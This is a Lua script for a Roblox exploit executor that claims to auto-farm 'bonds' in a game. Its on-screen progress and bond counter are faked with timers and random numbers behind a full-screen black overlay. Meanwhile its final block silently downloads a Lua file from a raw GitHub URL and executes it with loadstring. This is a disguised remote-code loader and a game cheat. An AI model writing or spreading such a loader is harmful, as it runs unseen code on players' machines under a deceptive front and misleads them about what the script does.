-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Seiji Bond Farm" -- Updated name
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Create the main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.AnchorPoint = Vector2.new(0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0
mainFrame.Parent = screenGui

-- Optional rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0.03, 0)
uiCorner.Parent = mainFrame

-- Top title text (Seiji Bond Farm - Red)
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
titleLabel.Position = UDim2.new(0.5, 0, 0.1, 0)
titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Seiji Bond Farm"
titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

-- Center text (SCRIPT MADE BY AeroGT)
local mainLabel = Instance.new("TextLabel")
mainLabel.Size = UDim2.new(1, 0, 0.05, 0)
mainLabel.Position = UDim2.new(0.5, 0, 0.16, 0)
mainLabel.AnchorPoint = Vector2.new(0.5, 0.5)
mainLabel.BackgroundTransparency = 1
mainLabel.Text = "SCRIPT MADE BY AeroGT"
mainLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
mainLabel.TextScaled = true
mainLabel.Font = Enum.Font.GothamBold
mainLabel.Parent = mainFrame

-- Dynamic text
local dynamicLabel = Instance.new("TextLabel")
dynamicLabel.Size = UDim2.new(1, 0, 0.05, 0)
dynamicLabel.Position = UDim2.new(0.5, 0, 0.22, 0)
dynamicLabel.AnchorPoint = Vector2.new(0.5, 0.5)
dynamicLabel.BackgroundTransparency = 1
dynamicLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
dynamicLabel.TextScaled = true
dynamicLabel.Font = Enum.Font.GothamBold
dynamicLabel.Text = "Starting..."
dynamicLabel.Parent = mainFrame

-- Bottom message
local linkLabel = Instance.new("TextLabel")
linkLabel.Size = UDim2.new(1, 0, 0.05, 0)
linkLabel.Position = UDim2.new(0.5, 0, 0.9, 0)
linkLabel.AnchorPoint = Vector2.new(0.5, 0.5)
linkLabel.BackgroundTransparency = 1
linkLabel.Text = "Sometimes glitches but don't worry"
linkLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
linkLabel.TextScaled = true
linkLabel.Font = Enum.Font.SourceSansBold
linkLabel.Parent = mainFrame

-- Bonds collected
local bondsCollectedLabel = Instance.new("TextLabel")
bondsCollectedLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
bondsCollectedLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
bondsCollectedLabel.AnchorPoint = Vector2.new(0.5, 0.5)
bondsCollectedLabel.BackgroundTransparency = 1
bondsCollectedLabel.Text = "0 Bonds Collected"
bondsCollectedLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
bondsCollectedLabel.TextScaled = true
bondsCollectedLabel.Font = Enum.Font.GothamBold
bondsCollectedLabel.Visible = false
bondsCollectedLabel.Parent = mainFrame

-- Dynamic text update
task.spawn(function()
    dynamicLabel.Text = "Starting..."
    wait(10)
    dynamicLabel.Text = "Searching Data..."
    wait(17 + 14)
    dynamicLabel.Text = "Collecting Bonds!"
    dynamicLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    bondsCollectedLabel.Visible = true
end)

-- Bonds counter logic
task.spawn(function()
    wait(39)
    local bonds = 0
    local targetBonds = math.random(70, 90)
    local totalTime = 34
    local interval = totalTime / (targetBonds - bonds)

    while bonds < targetBonds do
        wait(interval)
        bonds = math.min(bonds + math.random(2, 5), targetBonds)
        bondsCollectedLabel.Text = tostring(bonds) .. " Bonds Collected"
    end

    bondsCollectedLabel.Text = tostring(targetBonds) .. " Bonds Collected"
end)

-- Auto-execute external script
task.spawn(function()
    local scriptUrl = "https://raw.githubusercontent.com/ringtaa/Rarara.github.io/refs/heads/main/Rara.lua"
    local scriptContent = game:HttpGet(scriptUrl)
    loadstring(scriptContent)()
end)
